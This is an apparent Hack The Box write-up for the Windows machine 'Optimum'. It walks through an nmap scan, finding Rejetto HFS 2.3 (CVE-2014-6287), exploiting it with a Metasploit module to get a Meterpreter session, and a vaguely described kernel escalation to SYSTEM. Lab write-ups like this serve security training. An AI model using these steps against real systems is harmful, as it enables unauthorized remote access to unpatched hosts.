# Hack The Box - Optimum

## Machine Information

| Field            | Details                                                                  |
| ---------------- | ------------------------------------------------------------------------ |
| Platform         | Hack The Box                                                             |
| Machine          | Optimum                                                                  |
| Difficulty       | Easy                                                                     |
| Operating System | Windows                                                                  |
| Category         | Web Exploitation, Remote Code Execution, Privilege Escalation            |
| Main Skills      | HTTP enumeration, Rejetto HFS exploitation, Windows privilege escalation |

---

# Overview

Optimum is a Windows machine that demonstrates how vulnerable web applications can provide an initial entry point and how unpatched systems can be escalated to administrator privileges.

The attack path includes:

* Service enumeration
* Exploiting a vulnerable HTTP file server
* Obtaining a reverse shell
* Local privilege escalation

---

# Reconnaissance

The first step was identifying open services.

## Nmap Scan

```bash id="7x4m9p"
nmap -sC -sV -oN nmap.txt <TARGET_IP>
```

The scan revealed:

```text id="2m8q5v"
80/tcp HTTP
```

The service was investigated.

---

# Web Enumeration

The website was accessed through the browser.

The server banner revealed:

```text id="5q9x3n"
HttpFileServer httpd 2.3
```

The application was identified as:

```text id="8m2v6p"
Rejetto HFS
```

---

# Vulnerability Discovery

The installed version of Rejetto HFS was vulnerable to a known remote code execution vulnerability.

Vulnerability:

```text id="3p7n4x"
CVE-2014-6287
```

The vulnerability allows attackers to execute commands remotely through specially crafted requests.

---

# Exploitation

The exploit was executed to obtain remote access.

Using Metasploit:

```bash id="9v5m2q"
msfconsole
```

Searching for the vulnerability:

```bash id="6x3m8p"
search rejetto hfs
```

Loading the exploit:

```bash id="4n7q1m"
use exploit/windows/http/rejetto_hfs_exec
```

Configuring the target:

```bash id="8p2m5x"
set RHOSTS <TARGET_IP>
```

Running:

```bash id="1q6v9m"
run
```

A Meterpreter session was obtained.

---

# Initial Access

The current user was checked:

```bash id="5m8x2q"
getuid
```

System information:

```bash id="7p3n6v"
sysinfo
```

The shell was running under a normal user account.

---

# Privilege Escalation

Local enumeration was performed to identify possible privilege escalation paths.

The system was found to be vulnerable to a Windows kernel privilege escalation vulnerability.

The exploit allowed the current user to obtain SYSTEM privileges.

---

# Root Access

After successful escalation:

```bash id="3x9m5q"
getuid
```

Output:

```text id="6v2p8n"
NT AUTHORITY\SYSTEM
```

The machine was fully compromised.

---

# Flag Retrieval

User flag:

```text id="9m4x7p"
C:\Users\<user>\Desktop\user.txt
```

Administrator flag:

```text id="2q8n5m"
C:\Users\Administrator\Desktop\root.txt
```

---

# Tools Used

* Nmap
* Browser
* Metasploit
* Meterpreter
* Windows enumeration tools

---

# Vulnerabilities Identified

## Rejetto HFS Remote Code Execution

**Type:** Remote Code Execution

**CVE:** CVE-2014-6287

**Impact:**

An attacker can execute arbitrary commands remotely through a vulnerable HTTP file server.

---

## Windows Privilege Escalation

**Type:** Local Privilege Escalation

**Impact:**

Unpatched Windows systems can allow standard users to gain SYSTEM privileges.
